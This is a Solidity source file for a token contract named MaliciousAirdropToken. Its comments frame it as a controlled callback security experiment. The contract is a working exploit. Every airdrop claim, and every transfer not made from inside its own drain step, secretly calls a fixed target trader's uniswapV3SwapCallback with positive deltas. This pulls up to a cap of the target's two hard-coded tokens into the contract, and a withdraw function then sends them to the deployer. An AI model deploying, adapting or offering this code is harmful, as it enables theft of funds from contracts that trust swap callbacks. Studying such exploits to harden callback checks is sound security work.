// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface IUniswapV3SwapCallback {
    /// @notice Pays positive token deltas to the callback caller.
    /// @param amount0Delta Positive when token0 is owed.
    /// @param amount1Delta Positive when token1 is owed.
    /// @param data Opaque callback data; unused by this controlled experiment.
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
}

interface ITraderDrainTarget is IUniswapV3SwapCallback {
    function token0() external view returns (IERC20);
    function token1() external view returns (IERC20);
    function maxCallbackPayment() external view returns (uint256);
}

/// @title MaliciousAirdropToken
/// @notice Deliberately non-standard ERC-20 for a controlled callback security experiment.
/// @dev Normal transfers and airdrop claims intentionally invoke a fixed trader callback.
contract MaliciousAirdropToken is ERC20 {
    using SafeERC20 for IERC20;

    error UnsupportedChain(uint256 chainId);
    error InvalidConfiguration();
    error UnexpectedTraderTokens(address actualToken0, address actualToken1);
    error AlreadyClaimed(address claimant);
    error NotOwner(address caller);

    enum Trigger {
        Transfer,
        Airdrop
    }

    event DrainTriggered(Trigger indexed trigger, address indexed targetTrader, uint256 amount0, uint256 amount1);
    event AirdropClaimed(address indexed claimant, uint256 amount);
    event Withdrawn(address indexed owner, uint256 amount0, uint256 amount1);

    address public constant TOKEN0 = 0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238;
    address public constant TOKEN1 = 0x08210F9170F89Ab7658F0B5E3fF39b0E03C594D4;

    address public immutable targetTrader;
    address public immutable owner;
    uint256 public immutable airdropAmount;

    mapping(address claimant => bool hasClaimed) public claimed;

    uint8 private immutable _maliciousDecimals;
    bool private _executing;

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert NotOwner(msg.sender);
        }
        _;
    }

    /// @param targetTrader_ Fixed vulnerable trader target.
    /// @param airdropAmount_ Malicious-token amount minted per claimant.
    /// @param name_ Token name.
    /// @param symbol_ Token symbol.
    /// @param decimals_ Token decimals.
    constructor(
        address targetTrader_,
        uint256 airdropAmount_,
        string memory name_,
        string memory symbol_,
        uint8 decimals_
    ) ERC20(name_, symbol_) {
        if (targetTrader_ == address(0) || airdropAmount_ == 0) {
            revert InvalidConfiguration();
        }

        address actualToken0 = address(ITraderDrainTarget(targetTrader_).token0());
        address actualToken1 = address(ITraderDrainTarget(targetTrader_).token1());
        if (actualToken0 != TOKEN0 || actualToken1 != TOKEN1) {
            revert UnexpectedTraderTokens(actualToken0, actualToken1);
        }

        targetTrader = targetTrader_;
        owner = msg.sender;
        airdropAmount = airdropAmount_;
        _maliciousDecimals = decimals_;
    }

    /// @notice Returns the configured malicious-token decimals.
    function decimals() public view override returns (uint8) {
        return _maliciousDecimals;
    }

    /// @notice Mints the advertised airdrop once and secretly triggers the fixed callback attack.
    function claimAirdrop() external {
        if (claimed[msg.sender]) {
            revert AlreadyClaimed(msg.sender);
        }

        claimed[msg.sender] = true;
        _mint(msg.sender, airdropAmount);
        emit AirdropClaimed(msg.sender, airdropAmount);
        _drainStep(Trigger.Airdrop);
    }

    /// @notice Transfers all retained fixed token0 and token1 proceeds to the deployment owner.
    function withdraw() external onlyOwner {
        uint256 amount0 = IERC20(TOKEN0).balanceOf(address(this));
        uint256 amount1 = IERC20(TOKEN1).balanceOf(address(this));

        if (amount0 != 0) {
            IERC20(TOKEN0).safeTransfer(owner, amount0);
        }
        if (amount1 != 0) {
            IERC20(TOKEN1).safeTransfer(owner, amount1);
        }

        emit Withdrawn(owner, amount0, amount1);
    }

    function _update(address from, address to, uint256 value) internal override {
        super._update(from, to, value);

        if (from != address(0) && to != address(0) && !_executing) {
            _drainStep(Trigger.Transfer);
        }
    }

    function _drainStep(Trigger trigger) private {
        if (_executing) {
            return;
        }

        uint256 cap = ITraderDrainTarget(targetTrader).maxCallbackPayment();
        uint256 maximumSigned = uint256(type(int256).max);
        uint256 amount0 = _min(_min(IERC20(TOKEN0).balanceOf(targetTrader), cap), maximumSigned);
        uint256 amount1 = _min(_min(IERC20(TOKEN1).balanceOf(targetTrader), cap), maximumSigned);

        if (amount0 == 0 && amount1 == 0) {
            return;
        }

        _executing = true;
        IUniswapV3SwapCallback(targetTrader).uniswapV3SwapCallback(int256(amount0), int256(amount1), bytes(""));
        _executing = false;

        emit DrainTriggered(trigger, targetTrader, amount0, amount1);
    }

    function _min(uint256 left, uint256 right) private pure returns (uint256) {
        return left < right ? left : right;
    }
}
